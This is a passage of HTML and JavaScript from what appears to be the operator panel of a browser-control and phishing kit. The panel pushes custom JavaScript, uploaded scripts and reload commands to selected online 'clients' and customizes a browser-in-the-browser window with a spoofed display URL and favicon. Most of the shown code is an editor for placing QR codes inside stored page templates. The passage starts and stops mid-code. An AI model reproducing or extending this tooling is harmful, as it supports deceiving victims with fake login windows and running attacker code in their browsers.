                    <button id="resetPositionBtn" class="btn secondary">Reset Position</button>
                    <button id="saveLocationBtn" class="btn primary">Save Location</button>
                </div>
            </div>
        </div>
    </div>
    

    <div id="viewer-context-menu" class="viewer-context-menu">
        <!-- BASE ITEMS (Main Events) -->
        <div id="viewer-base-items">
            <div class="context-menu-item" data-event="click">click</div>
            <div class="context-menu-item" data-event="mouseover">mouseover</div>
            <div class="context-menu-item" data-event="qr-area">QR Area</div>
            <div class="context-menu-item" id="viewer-more-events-btn" style="font-weight: bold; border-top: 1px solid #e0e0e0; margin-top: 4px; padding-top: 8px;">More ▼</div>
        </div>
        
        <!-- GROUPS CONTAINER -->
        <div id="viewer-groups-container" style="display: none; border-top: 1px solid #f1f1f1; max-height: 300px; overflow-y: auto;"></div>
        
        <!-- EVENTS CONTAINER -->
        <div id="viewer-events-container" style="display: none; border-top: 1px solid #f1f1f1; max-height: 300px; overflow-y: auto;"></div>
    </div>

    <div id="viewer-action-modal" class="viewer-modal">
        <div class="modal-card" style="max-width: 450px; padding: 25px; border-radius: 16px; background: #fff; box-shadow: 0 20px 50px rgba(0,0,0,0.15);">
            <div style="text-align: center; margin-bottom: 20px;">
                <div style="width: 60px; height: 60px; background: #f0f7ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px;">
                    <i class="fas fa-bolt" style="font-size: 24px; color: #3498db;"></i>
                </div>
                <h3 style="margin: 0; color: #2c3e50; font-size: 20px; font-weight: 700;">Select Action</h3>
                <p style="margin: 5px 0 0; color: #7f8c8d; font-size: 14px;">Event: <span id="viewer-action-event" style="color: #3498db; font-weight: 600;"></span></p>
                <p style="margin: 2px 0 0; color: #7f8c8d; font-size: 12px;">Target: <span id="viewer-action-target" style="color: #27ae60; font-weight: 600;"></span></p>
            </div>
            
            <div class="action-buttons-grid" style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 20px;">
                <button type="button" class="btn btn-primary" id="viewer-execute-js-btn" style="height: 50px; font-size: 13px;">
                    <i class="fas fa-code"></i> Execute JS
                </button>
                <button type="button" class="btn btn-success" id="viewer-copy-text-btn" style="height: 50px; font-size: 13px;">
                    <i class="fas fa-copy"></i> Copy Text
                </button>
                <button type="button" class="btn btn-dark" id="viewer-upload-js-btn" style="height: 50px; font-size: 13px;">
                    <i class="fas fa-file-upload"></i> Upload JS
                </button>
                <button type="button" class="btn btn-info" id="viewer-event-templates-btn" style="height: 50px; font-size: 13px;">
                    <i class="fas fa-cubes"></i> Templates
                </button>
                <button type="button" class="btn btn-warning" id="viewer-permissions-btn" style="height: 50px; font-size: 13px; grid-column: span 2;">
                    <i class="fas fa-key"></i> Permissions
                </button>
            </div>
            
            <div id="viewer-uploaded-files-list" style="margin-top: 15px; display: none;">
                <label style="display: block; margin-bottom: 8px; font-weight: 600;">Uploaded Files:</label>
                <div id="viewer-uploaded-files-container" style="max-height: 150px; overflow-y: auto; border: 1px solid #ddd; border-radius: 4px; padding: 8px;">
                    <p style="color: #666; font-size: 12px; margin: 0;">No files uploaded</p>
                </div>
            </div>
            
            <button type="button" class="btn btn-neutral" id="viewer-cancel-action" style="width: 100%; height: 45px;">
                <i class="fas fa-times"></i> Cancel
            </button>
        </div>
    </div>

    <div id="viewer-code-modal" class="viewer-modal">
        <div class="modal-card">
            <h3>Attach Event Handler</h3>
            <p>Target: <span id="viewer-selected-element" class="highlight"></span></p>
            <p>Event: <span id="viewer-selected-event" class="highlight"></span></p>
            <div id="viewer-code-container">
                <textarea id="viewer-code-textarea" placeholder="Enter JavaScript code here..."></textarea>
            </div>
            <div id="viewer-copy-container" style="display: none;">
                <label for="viewer-copy-text">Text to copy:</label>
                <textarea id="viewer-copy-text" placeholder="Enter text to copy to clipboard..."></textarea>
            </div>
            <div class="modal-buttons">
                <button type="button" class="btn btn-neutral btn-small" id="viewer-cancel-code">Cancel</button>
                <button type="button" class="btn btn-success btn-small" id="viewer-save-action">Save &amp; Attach to client</button>
            </div>
        </div>
    </div>

    <!-- BITB Customization Modal -->
    <div id="bitb-custom-modal" class="viewer-modal">
        <div class="modal-card">
            <h3>Customize BITB Window</h3>
            <div style="margin-bottom: 15px;">
                <label for="bitb-favicon-input" style="display: block; margin-bottom: 5px; font-weight: 600;">Favicon URL or Domain:</label>
                <input type="text" id="bitb-favicon-input" placeholder="https://example.com/image.png or example.com" style="width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 4px;">
                <small style="color: #666;">Enter direct image URL (png/jpg/svg/etc) or domain name. Leave empty for default</small>
            </div>
            <div style="margin-bottom: 15px;">
                <label for="bitb-url-input" style="display: block; margin-bottom: 5px; font-weight: 600;">Display URL:</label>
                <input type="text" id="bitb-url-input" placeholder="https://localhost/filename.html" style="width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 4px;">
                <small style="color: #666;">Leave empty to use default</small>
            </div>
            <div class="modal-buttons">
                <button type="button" class="modal-button secondary" id="bitb-cancel-btn">Cancel</button>
                <button type="button" class="modal-button primary" id="bitb-save-btn">Save &amp; Use</button>
            </div>
        </div>
    </div>
<!-- QR Preview Window Modal -->
    <div id="qr-preview-modal" class="viewer-modal">
        <div class="modal-card" style="max-width: 95vw; max-height: 95vh; width: 95vw; height: 95vh; display: flex; flex-direction: column;">
            <h3>QR Preview & Placement</h3>
            <div style="flex: 1; overflow: auto; border: 2px dashed #ddd; margin: 15px 0; padding: 20px; background: #fafafa; position: relative; min-height: 400px;" id="qr-preview-content">
                <!-- Content will be rendered here -->
            </div>
            <div style="display: flex; gap: 15px; align-items: center; margin-bottom: 20px; background: #f8fbff; padding: 15px; border-radius: 10px; border: 1px solid #e1efff;">
                <label style="font-weight: 700; color: #2c3e50; min-width: 70px;">QR Size:</label>
                <input type="range" id="qr-size-slider" min="50" max="300" value="150" style="flex: 1; cursor: pointer;">
                <span id="qr-size-value" style="font-family: monospace; font-weight: 700; color: #3498db; background: #fff; padding: 4px 10px; border-radius: 6px; border: 1px solid #d6eaff; min-width: 60px; text-align: center;">150px</span>
                <button type="button" class="btn btn-info" onclick="addQRDivToPreview()">
                    <i class="fas fa-plus-circle"></i> Add QR Div
                </button>
                <button type="button" class="btn btn-danger" onclick="removeAllEdenQR()" style="background: #e74c3c; color: white;">
                    <i class="fas fa-trash"></i> Remove All EdenQR
                </button>
            </div>
            <div style="display: flex; gap: 12px; margin-top: auto;">
                <button type="button" class="btn btn-neutral" onclick="closeQRPreviewWindow()" style="flex: 1; padding: 12px; border-radius: 10px;">
                    <i class="fas fa-times"></i> Cancel
                </button>
                <button type="button" class="btn btn-success" onclick="applyQRPreview()" style="flex: 2; padding: 12px; border-radius: 10px; box-shadow: 0 4px 12px rgba(46, 204, 113, 0.2);">
                    <i class="fas fa-save"></i> Apply & Save Template
                </button>
            </div>
        </div>
    </div>
    <script>
        (function() {
            const selectionStates = new Map();
            const contextMenu = document.getElementById('viewer-context-menu');
            let contextMenuPinned = false;
            const actionModal = document.getElementById('viewer-action-modal');
            const codeModal = document.getElementById('viewer-code-modal');
            const actionEventSpan = document.getElementById('viewer-action-event');
            const actionTargetSpan = document.getElementById('viewer-action-target');
            const selectedElementSpan = document.getElementById('viewer-selected-element');
            const selectedEventSpan = document.getElementById('viewer-selected-event');
            const executeBtn = document.getElementById('viewer-execute-js-btn');
            const copyBtn = document.getElementById('viewer-copy-text-btn');
            const cancelActionBtn = document.getElementById('viewer-cancel-action');
            const cancelCodeBtn = document.getElementById('viewer-cancel-code');
            const saveActionBtn = document.getElementById('viewer-save-action');
            const codeTextarea = document.getElementById('viewer-code-textarea');
            const copyTextarea = document.getElementById('viewer-copy-text');
            const codeContainer = document.getElementById('viewer-code-container');
            const copyContainer = document.getElementById('viewer-copy-container');
            const eventTemplatesBtn = document.getElementById('viewer-event-templates-btn');
            const permissionsBtn = document.getElementById('viewer-permissions-btn');
            const manualReloadBtn = document.getElementById('manualReloadBtn');

            if (manualReloadBtn) {
                manualReloadBtn.addEventListener('click', () => {
                    const selectedClients = Object.keys(clients).filter(key => clients[key].selected && clients[key].status === 'online');
                    if (selectedClients.length === 0) {
                        showStatusMessage('warning', 'Please select at least one client first');
                        return;
                    }
                    
                    sendToSelectedClients({
                        type: 'manualReload',
                        broadcast: true,
                        reloadDelay: 1.5
                    });
                    showStatusMessage('success', 'Manual reload sent – client will reload with no file applied');
                });
            }

            let currentActionType = null;
            let currentStateForAction = null;

            // Shared Eden template context menu for Display / Blur / BITB buttons
            let edenTemplateMenu = null;
            let edenTemplateContext = null;

            // QR Preview Window functionality
            let qrPreviewData = null;
            let qrPreviewDivs = [];
            
            // Global drag state
            let currentDragQR = null;
            let currentDragContainer = null;
            let dragInitialX = 0;
            let dragInitialY = 0;

            document.addEventListener('mousemove', function(e) {
                if (!currentDragQR || !currentDragContainer) return;
                
                // Use offsetParent if available for more accurate relative positioning
                // If the QR code is inside a specific element, currentDragContainer should be that element
                // But dragging might change parents? For now, keep parent stable.
                
                const containerRect = currentDragContainer.getBoundingClientRect();
                const size = parseInt(currentDragQR.style.width);
                let x = e.clientX - containerRect.left - dragInitialX;
                let y = e.clientY - containerRect.top - dragInitialY;
                
                // Allow dragging outside parent (remove constraints)
                // x = Math.max(0, Math.min(x, containerRect.width - size));
                // y = Math.max(0, Math.min(y, containerRect.height - size));
                
                currentDragQR.style.left = x + 'px';
                currentDragQR.style.top = y + 'px';
                
                // Also update the real body div if it exists
                if (currentDragQR._edenQRRealDiv) {
                    currentDragQR._edenQRRealDiv.style.left = x + 'px';
                    currentDragQR._edenQRRealDiv.style.top = y + 'px';
                }
            });

            document.addEventListener('mouseup', function(e) {
                if (currentDragQR) {
                    // Update final position in real div
                    if (currentDragQR._edenQRRealDiv) {
                        currentDragQR._edenQRRealDiv.style.left = currentDragQR.style.left;
                        currentDragQR._edenQRRealDiv.style.top = currentDragQR.style.top;
                    }
                    
                    // Try to re-parent the QR code based on where it was dropped
                    // This allows "Element-based" positioning just by dragging!
                    const previewContent = document.getElementById('qr-preview-content');
                    const wrapper = previewContent ? previewContent.querySelector('.qr-preview-wrapper') : null;
                    
                    if (wrapper && qrPreviewData && qrPreviewData.parsedDoc) {
                        const qrRect = currentDragQR.getBoundingClientRect();
                        const centerX = qrRect.left + qrRect.width / 2;
                        const centerY = qrRect.top + qrRect.height / 2;
                        
                        // Hide QR temporarily to find what's underneath
                        currentDragQR.style.display = 'none';
                        let targetElement = document.elementFromPoint(centerX, centerY);
                        currentDragQR.style.display = 'flex';
                        
                        // Find valid container inside wrapper
                        while (targetElement && targetElement !== wrapper && !wrapper.contains(targetElement)) {
                            targetElement = targetElement.parentElement;
                        }
                        
                        if (targetElement && targetElement !== wrapper && targetElement !== previewContent) {
                            // We found a specific element to attach to!
                            // Check if we need to move it
                            if (currentDragQR.parentElement !== targetElement) {
                                // Calculate new relative coordinates
                                const targetRect = targetElement.getBoundingClientRect();
                                const newX = centerX - targetRect.left - (parseInt(currentDragQR.style.width)/2);
                                const newY = centerY - targetRect.top - (parseInt(currentDragQR.style.height)/2);
                                
                                // Update Visual
                                if (getComputedStyle(targetElement).position === 'static') {
                                    targetElement.style.position = 'relative';
                                }
                                targetElement.appendChild(currentDragQR);
                                currentDragQR.style.left = newX + 'px';
                                currentDragQR.style.top = newY + 'px';
                                
                                // Update Real Struct
                                const doc = qrPreviewData.parsedDoc;
                                let realTarget = null;
                                if (targetElement._edenQROriginalNode) {
                                    realTarget = targetElement._edenQROriginalNode;
                                } else {
                                    const path = getDomPath(targetElement, wrapper);
                                    realTarget = findElementByPath(doc.body, path);
                                }
                                
                                if (realTarget && currentDragQR._edenQRRealDiv) {
                                    if (realTarget.style.position === 'static' || !realTarget.style.position) {
                                        realTarget.style.position = 'relative';
                                    }
                                    realTarget.appendChild(currentDragQR._edenQRRealDiv);
                                    currentDragQR._edenQRRealDiv.style.left = newX + 'px';
                                    currentDragQR._edenQRRealDiv.style.top = newY + 'px';
                                }
                            }
                        }
                    }
                    
                    currentDragQR = null;
                    currentDragContainer = null;
                }
            });

            window.handleAddEdenQR = function(actionType, section) {
                openQRPreviewWindow(actionType, section);
                if (edenTemplateMenu) {
                    edenTemplateMenu.remove();
                    edenTemplateMenu = null;
                }
            };

            window.openQRPreviewWindow = function(actionType, section) {
                let content = '';
                // FIX: Use fileName property (not file) from edenTemplateContext
                const fileContext = edenTemplateContext?.fileName;
                const mode = edenTemplateContext?.mode;

                console.log('Opening QR Preview for:', { actionType, section, fileContext, mode });

                if (fileContext) {
                    // Try fileStorage first (for Display/BITB files)
                    const fileData = typeof fileStorage !== 'undefined' ? fileStorage.get(fileContext) : null;
                    if (fileData && fileData.data) {
                        content = fileData.data;
                        console.log('Found content in fileStorage for:', fileContext);
                    } else {
                        // Try blurFiles if not in fileStorage (for Blur section files)
                        const blurFiles = typeof window.loadBlurFiles === 'function' ? window.loadBlurFiles() : {};
                        if (blurFiles[fileContext]) {
                            content = blurFiles[fileContext];
                            console.log('Found content in blurFiles for:', fileContext);
                        }
                    }
                }

                // Fallback for Blur section
                if (!content && (section === 'Blur' || mode === 'blur')) {
                    content = localStorage.getItem('eden-blur-last-content') || '';
                    console.log('Using last blur content from localStorage');
                }
                
                // Last fallback: code editor content
                if (!content) {
                    const codeInput = document.getElementById('codeInput');
                    content = codeInput ? codeInput.value.trim() : '';
                    console.log('Using content from code editor');
                }

                qrPreviewData = {
                    actionType: actionType,
                    section: section,
                    content: content,
                    fileName: fileContext || 'editor-content.html'
                };

                const previewModal = document.getElementById('qr-preview-modal');
                if (previewModal) {
                    const previewContent = document.getElementById('qr-preview-content');
                    const sizeSlider = document.getElementById('qr-size-slider');
                    const sizeValue = document.getElementById('qr-size-value');

                    if (previewContent) {
                        previewContent.innerHTML = '';
                        qrPreviewDivs = [];
                        previewContent.style.position = 'relative';

                        if (content && typeof content === 'string') {
                            // Parse the FULL HTML document into a real DOM
                            const isFullDocument = content.trim().toLowerCase().startsWith('<!doctype') || 
                                                  content.trim().toLowerCase().startsWith('<html');
                            
                            if (isFullDocument) {
                                // Parse the entire HTML document
                                const parser = new DOMParser();
                                const fullDoc = parser.parseFromString(content, 'text/html');
                                
                                // Store the parsed document for later serialization
                                qrPreviewData.parsedDoc = fullDoc;
                                
                                // Get the body element (create if doesn't exist)
                                let body = fullDoc.body;
                                if (!body) {
                                    body = fullDoc.createElement('body');
                                    if (fullDoc.documentElement) {
                                        fullDoc.documentElement.appendChild(body);
                                    }
                                }
                                
                                // Create a wrapper that contains the ACTUAL body DOM nodes
                                // This is the REAL DOM tree we're editing, not a copy
                                const contentWrapper = document.createElement('div');
                                contentWrapper.className = 'qr-preview-wrapper';
                                contentWrapper.style.cssText = 'position: relative; width: 100%; height: auto; min-height: 100%; overflow: visible;';
                                
                                // Store reference to the actual body element
                                contentWrapper._edenQRBody = body;
                                
                                // Clone body's child nodes into wrapper for display
                                // But maintain mapping to original nodes
                                Array.from(body.childNodes).forEach((node, index) => {
                                    if (node.nodeType === Node.ELEMENT_NODE || node.nodeType === Node.TEXT_NODE) {
                                        const cloned = node.cloneNode(true);
                                        cloned._edenQROriginalIndex = index;
                                        cloned._edenQROriginalNode = node;
                                        contentWrapper.appendChild(cloned);
                                    }
                                });
                                
                                // Extract and inject styles from head
                                const styleMatch = content.match(/<style[^>]*>([\s\S]*?)<\/style>/gi);
                                if (styleMatch) {
                                    const styleTag = document.createElement('style');
                                    styleTag.textContent = styleMatch.map(s => s.replace(/<\/?style[^>]*>/gi, '')).join('\n');
                                    contentWrapper.appendChild(styleTag);
                                }
                                
                                // Extract and inject link tags for external stylesheets
                                const linkMatch = content.match(/<link[^>]*rel=["']stylesheet["'][^>]*>/gi);
                                if (linkMatch) {
                                    linkMatch.forEach(linkTag => {
                                        const link = document.createElement('link');
                                        const hrefMatch = linkTag.match(/href=["']([^"']+)["']/i);
                                        const relMatch = linkTag.match(/rel=["']([^"']+)["']/i);
                                        if (hrefMatch) link.href = hrefMatch[1];
                                        if (relMatch) link.rel = relMatch[1];
                                        document.head.appendChild(link);
                                    });
                                }
                                
                                previewContent.appendChild(contentWrapper);
                                console.log('Preview content injected as real DOM tree with body reference');
                            } else {
                                // For HTML fragments, create a simple wrapper
                                const contentWrapper = document.createElement('div');
                                contentWrapper.className = 'qr-preview-wrapper';
                                contentWrapper.style.cssText = 'position: relative; width: 100%; height: auto; min-height: 100%; overflow: visible;';
                                contentWrapper.innerHTML = content;
                                previewContent.appendChild(contentWrapper);
                            }
                        } else {
                            console.warn('Content is not a valid string for preview:', typeof content);
                            previewContent.innerHTML = '<div style="padding: 20px; text-align: center; color: #999;">No preview available for this content type. Click anywhere to add QR div.</div>';
                        }

                        // Click handler removed - use the "Add QR Div" button instead
                        previewContent.onclick = null;

                        if (sizeSlider) {
                            sizeSlider.oninput = function() {
                                const newSize = parseInt(this.value);
                                if (sizeValue) sizeValue.textContent = newSize + 'px';
                                const selectedQR = previewContent.querySelector('.EdenQR.selected');
                                if (selectedQR) {
                                    selectedQR.style.width = newSize + 'px';
                                    selectedQR.style.height = newSize + 'px';
                                    generateQRCodeInDiv(selectedQR, newSize);
                                    
                                    // Update real div size if it exists
                                    if (selectedQR._edenQRRealDiv) {
                                        selectedQR._edenQRRealDiv.style.width = newSize + 'px';
                                        selectedQR._edenQRRealDiv.style.height = newSize + 'px';
                                    }
                                }
                            };
                        }
                    }
                    previewModal.style.display = 'flex';
                }
            }

            // Insert QR div into the REAL HTML body at clicked position
            function insertQRDivIntoBody(event, wrapper) {
                const sizeSlider = document.getElementById('qr-size-slider');
                if (!sizeSlider) return;
                
                const size = parseInt(sizeSlider.value);
                const body = wrapper._edenQRBody;
                const parsedDoc = qrPreviewData.parsedDoc;
                if (!body || !parsedDoc) return;
                
                // Find the element at the clicked position in the wrapper
                const clickX = event.clientX;
                const clickY = event.clientY;
                const wrapperRect = wrapper.getBoundingClientRect();
                const relativeX = clickX - wrapperRect.left;
                const relativeY = clickY - wrapperRect.top;
                
                // Find the deepest element at this position
                const elementAtPoint = document.elementFromPoint(clickX, clickY);
                let targetElement = null;
                
                // Walk up from clicked element to find one inside wrapper
                let current = elementAtPoint;
                while (current && current !== wrapper && !wrapper.contains(current)) {
                    current = current.parentElement;
                }
                if (current && current !== wrapper) {
                    targetElement = current;
                }
                
                // Create EdenQR div in the PARSED DOCUMENT (not current document)
                const uniqueId = 'EdenQR_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
                const qrDiv = parsedDoc.createElement('div');
                qrDiv.id = uniqueId;
                qrDiv.className = 'EdenQR';
                qrDiv.style.cssText = `position: absolute; width: ${size}px; height: ${size}px; left: ${relativeX - (size/2)}px; top: ${relativeY - (size/2)}px; z-index: 9999;`;
                
                // Insert into REAL body at the correct position
                if (targetElement && targetElement._edenQROriginalNode) {
                    // Insert after the original node in the body
                    const originalNode = targetElement._edenQROriginalNode;
                    const nextSibling = originalNode.nextSibling;
                    if (nextSibling) {
                        body.insertBefore(qrDiv, nextSibling);
                    } else {
                        body.appendChild(qrDiv);
                    }
                } else {
                    // Append to end of body
                    body.appendChild(qrDiv);
                }
                
                // Also add to wrapper for visual feedback (create in current document)
                const visualQR = document.createElement('div');
                visualQR.id = uniqueId;
                visualQR.className = 'EdenQR selected';
                visualQR.setAttribute('data-edenqr', 'true');
                visualQR.style.cssText = `position: absolute; width: ${size}px; height: ${size}px; left: ${relativeX - (size/2)}px; top: ${relativeY - (size/2)}px; border: 2px solid #2196F3; background: rgba(33, 150, 243, 0.1); cursor: move; z-index: 1001; pointer-events: auto; display: flex; align-items: center; justify-content: center; overflow: hidden;`;
                visualQR._edenQRRealDiv = qrDiv; // Link to real div in parsed doc
                wrapper.appendChild(visualQR);
                makeQRDivDraggable(visualQR, wrapper);
                generateQRCodeInDiv(visualQR, size);
                qrPreviewDivs.push(visualQR);
            }
            
            function addQRDivToElement(event, targetElement, wrapper) {
                const sizeSlider = document.getElementById('qr-size-slider');
                if (!sizeSlider) return;
                
                const size = parseInt(sizeSlider.value);
                
                // Calculate position relative to the TARGET ELEMENT
                const rect = targetElement.getBoundingClientRect();
                const x = event.clientX - rect.left - (size / 2);
                const y = event.clientY - rect.top - (size / 2);
                
                // Ensure target has positioning context if it's not the wrapper
                const computedStyle = window.getComputedStyle(targetElement);
                if (computedStyle.position === 'static') {
                    targetElement.style.position = 'relative';
                }
                
                // Create Visual Div (append to target)
                const qrDiv = createQRDiv(size, x, y, targetElement); // Note: dragging uses target as container
                targetElement.appendChild(qrDiv);
                
                        // Handle Real Div for Full Documents
                        if (qrPreviewData && qrPreviewData.parsedDoc && wrapper._edenQRBody) {
                            const doc = qrPreviewData.parsedDoc;
                            let realTarget = null;

                            // 1. Try finding target by _edenQROriginalNode property
                            // The visual elements in wrapper are CLONES of parsedDoc elements
                            // They should have _edenQROriginalNode attached in openQRPreviewWindow
                            if (targetElement._edenQROriginalNode) {
                                realTarget = targetElement._edenQROriginalNode;
                            } else {
                                // 2. If no direct link, try path matching as fallback
                                const path = getDomPath(targetElement, wrapper);
                                realTarget = findElementByPath(doc.body, path);
                            }

                            if (realTarget) {
                                if (realTarget.style.position === 'static' || !realTarget.style.position) {
                                    realTarget.style.position = 'relative';
                                }
                                const realDiv = doc.createElement('div');
                                realDiv.id = qrDiv.id;
                                realDiv.className = 'EdenQR';
                                realDiv.style.cssText = `position: absolute; width: ${size}px; height: ${size}px; left: ${x}px; top: ${y}px; z-index: 9999;`;
                                realTarget.appendChild(realDiv);
                                qrDiv._edenQRRealDiv = realDiv;
                            } else {
                                // 3. Fallback: Attach to BODY if real target not found (ensures saving)
                                // We calculate position relative to body
                                const wrapperRect = wrapper.getBoundingClientRect();
                                const targetRect = targetElement.getBoundingClientRect();
                                const bodyX = targetRect.left - wrapperRect.left + x;
                                const bodyY = targetRect.top - wrapperRect.top + y;
                                
                                const realDiv = doc.createElement('div');
                                realDiv.id = qrDiv.id;
                                realDiv.className = 'EdenQR';
                                realDiv.style.cssText = `position: absolute; width: ${size}px; height: ${size}px; left: ${bodyX}px; top: ${bodyY}px; z-index: 9999;`;
                                doc.body.appendChild(realDiv);
                                qrDiv._edenQRRealDiv = realDiv;
                                console.warn('Could not find real target element, attached QR to body as fallback');
                            }
                        }
                
                qrPreviewDivs.push(qrDiv);
                if (qrDiv.click) qrDiv.click();
            }

            // Helper to get path of element relative to root
            function getDomPath(el, root) {
                const stack = [];
                while (el && el !== root) {
                    let sib = el;
                    let nth = 0;
                    while (sib = sib.previousElementSibling) { nth++; }
                    stack.unshift(nth);
                    el = el.parentElement;
                }
                return stack;
            }

            // Helper to find element by path
            function findElementByPath(root, path) {
                let el = root;
                for (let i = 0; i < path.length; i++) {
                    if (!el || !el.children) return null;
                    el = el.children[path[i]];
                }
                return el;
            }
            
            function addQRDivAtPosition(event, container) {
                const sizeSlider = document.getElementById('qr-size-slider');
                if (!sizeSlider) return;

                const size = parseInt(sizeSlider.value);
                const rect = container.getBoundingClientRect();
                const x = event.clientX - rect.left - (size / 2);
                const y = event.clientY - rect.top - (size / 2);

                const qrDiv = createQRDiv(size, x, y, container);
                container.appendChild(qrDiv);
                qrPreviewDivs.push(qrDiv);
            }

            window.addQRDivToPreview = function() {
                const previewContent = document.getElementById('qr-preview-content');
                const sizeSlider = document.getElementById('qr-size-slider');
                const wrapper = previewContent ? previewContent.querySelector('.qr-preview-wrapper') : null;
                
                if (!previewContent || !sizeSlider || !wrapper) return;

                // Deselect all existing QR divs
                const allQR = previewContent.querySelectorAll('.EdenQR');
                allQR.forEach(qr => {
                    qr.classList.remove('selected');
                    qr.style.border = '2px dashed #2196F3';
                });

                const size = parseInt(sizeSlider.value);
                
                // Calculate center position relative to WRAPPER (default placement)
                const previewRect = previewContent.getBoundingClientRect();
                const wrapperRect = wrapper.getBoundingClientRect();
                
                const x = (previewRect.left + previewRect.width / 2) - wrapperRect.left - (size / 2);
                const y = (previewRect.top + previewRect.height / 2) - wrapperRect.top - (size / 2);

                // Create Visual Div (append to wrapper initially)
                const qrDiv = createQRDiv(size, x, y, wrapper);
                wrapper.appendChild(qrDiv);
                
                // Create Real Div for Full Documents (default attached to body)
                if (qrPreviewData && qrPreviewData.parsedDoc && wrapper._edenQRBody) {
                    const doc = qrPreviewData.parsedDoc;
                    const realDiv = doc.createElement('div');
                    realDiv.id = qrDiv.id;
                    realDiv.className = 'EdenQR';
                    realDiv.style.cssText = `position: absolute; width: ${size}px; height: ${size}px; left: ${x}px; top: ${y}px; z-index: 9999;`;
                    
                    doc.body.appendChild(realDiv);
                    qrDiv._edenQRRealDiv = realDiv;
                }
                
                qrPreviewDivs.push(qrDiv);
                if (qrDiv.click) qrDiv.click();
            };
            
            window.removeAllEdenQR = function() {
                const previewContent = document.getElementById('qr-preview-content');
                if (!previewContent) return;
                
                const wrapper = previewContent.querySelector('.qr-preview-wrapper');
                const body = wrapper ? wrapper._edenQRBody : null;
                
                // Remove all divs with id containing "EdenQR", class="EdenQR", or data-edenqr attribute
                const allEdenQR = previewContent.querySelectorAll('[id*="EdenQR"], .EdenQR, [data-edenqr="true"]');
                if (allEdenQR.length === 0) {
                    alert('No EdenQR divs found to remove.');
                    return;
                }
                
                if (confirm(`Remove all ${allEdenQR.length} EdenQR div(s)?`)) {
                    // Remove from preview wrapper
                    allEdenQR.forEach(qr => qr.remove());
                    
                    // Also remove from real body if it exists
                    if (body && qrPreviewData.parsedDoc) {
                        const bodyQRDivs = body.querySelectorAll('.EdenQR, [id*="EdenQR"]');
                        bodyQRDivs.forEach(qr => qr.remove());
                    }
                    
                    qrPreviewDivs = qrPreviewDivs.filter(qr => qr.parentNode !== null);
                    console.log('All EdenQR divs removed from both preview and real body');
                }
            };

            function createQRDiv(size, x, y, container) {
                const qrDiv = document.createElement('div');
                // Use unique ID for multiple divs, but keep class for selection
                const uniqueId = 'EdenQR_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
                qrDiv.id = uniqueId;
                qrDiv.className = 'EdenQR selected';
                qrDiv.setAttribute('data-edenqr', 'true'); // Marker attribute
                // Removed Math.max(0, x/y) to allow negative positioning (on borders/outside)
                qrDiv.style.cssText = `position: absolute; width: ${size}px; height: ${size}px; border: 2px solid #2196F3; background: rgba(33, 150, 243, 0.1); cursor: move; left: ${x}px; top: ${y}px; display: flex; align-items: center; justify-content: center; overflow: hidden; z-index: 1001; pointer-events: auto;`;
                
                generateQRCodeInDiv(qrDiv, size);
                makeQRDivDraggable(qrDiv, container);

                qrDiv.addEventListener('click', function(e) {
                    e.stopPropagation();
                    const allQR = container.querySelectorAll('.EdenQR');
                    allQR.forEach(qr => {
                        qr.classList.remove('selected');
                        qr.style.border = '2px dashed #2196F3';
                    });
                    this.classList.add('selected');
                    this.style.border = '2px solid #2196F3';
                    const currentSize = parseInt(this.style.width);
                    const slider = document.getElementById('qr-size-slider');
                    const valueSpan = document.getElementById('qr-size-value');
                    if (slider) slider.value = currentSize;
                    if (valueSpan) valueSpan.textContent = currentSize + 'px';
                });

                return qrDiv;
            }

            function generateQRCodeInDiv(qrDiv, size) {
                const qrLinkInput = document.getElementById('edenqr-link');
                const qrLink = qrLinkInput ? qrLinkInput.value.trim() : 'https://example.com';
                qrDiv.innerHTML = '';
                
                if (typeof QRCodeStyling !== 'undefined') {
                    const qrCode = new QRCodeStyling({
                        width: size, height: size, type: "canvas", data: qrLink,
                        dotsOptions: { color: document.getElementById('edenqr-dotPrimary')?.value || '#000000', type: document.getElementById('edenqr-dotStyle')?.value || 'square' },
                        backgroundOptions: { color: document.getElementById('edenqr-backgroundColor')?.value || '#ffffff' },
                        cornersSquareOptions: { color: document.getElementById('edenqr-eyeOuterColor')?.value || '#000000', type: document.getElementById('edenqr-eyeStyle')?.value || 'square' },
                        cornersDotOptions: { color: document.getElementById('edenqr-eyeInnerColor')?.value || '#000000', type: document.getElementById('edenqr-innerEyeStyle')?.value || 'square' }
                    });
                    qrCode.append(qrDiv);
                } else {
                    qrDiv.innerHTML = `<div style="width:100%;height:100%;display:flex;align-items:center;justify-content:center;background:white;color:#333;font-size:${Math.max(10, size/10)}px;text-align:center;padding:5px;word-break:break-all;">QR: ${qrLink.substring(0,20)}...</div>`;
                }
            }

            function makeQRDivDraggable(qrDiv, container) {
                qrDiv.onmousedown = function(e) {
                    // Set global drag state
                    currentDragQR = qrDiv;
                    currentDragContainer = container;
                    const rect = qrDiv.getBoundingClientRect();
                    dragInitialX = e.clientX - rect.left;
                    dragInitialY = e.clientY - rect.top;
                };
                // Global mousemove/mouseup handlers are set in the IIFE scope
            }

            window.closeQRPreviewWindow = function() {
                const modal = document.getElementById('qr-preview-modal');
                if (modal) modal.style.display = 'none';
                qrPreviewData = null;
                qrPreviewDivs = [];
            };

            window.applyQRPreview = function() {
                if (!qrPreviewData) return;
                const previewContent = document.getElementById('qr-preview-content');
                const qrDivs = previewContent.querySelectorAll('.EdenQR');
                if (qrDivs.length === 0) {
                    alert('Please add a QR div first!');
                    return;
                }

                // Get the actual HTML content wrapper (the real DOM we're editing)
                const contentWrapper = previewContent.querySelector('.qr-preview-wrapper');
                if (!contentWrapper) {
                    alert('Error: Could not find content wrapper. Please try again.');
                    return;
                }

                // Serialize the edited DOM (including all EdenQR divs) back to HTML
                // This represents the REAL DOM tree with EdenQR divs physically inserted
                let updatedContent = '';
                
                // Check if original content was a full HTML document
                const originalContent = qrPreviewData.content;
                const isFullDocument = originalContent.trim().toLowerCase().startsWith('<!doctype') || 
                                      originalContent.trim().toLowerCase().startsWith('<html');
                
                if (isFullDocument && qrPreviewData.parsedDoc) {
                    // Use the parsed document that we've been editing
                    // The EdenQR divs are already inserted into the real body
                    const doc = qrPreviewData.parsedDoc;
                    const body = doc.body;
                    
                    if (!body) {
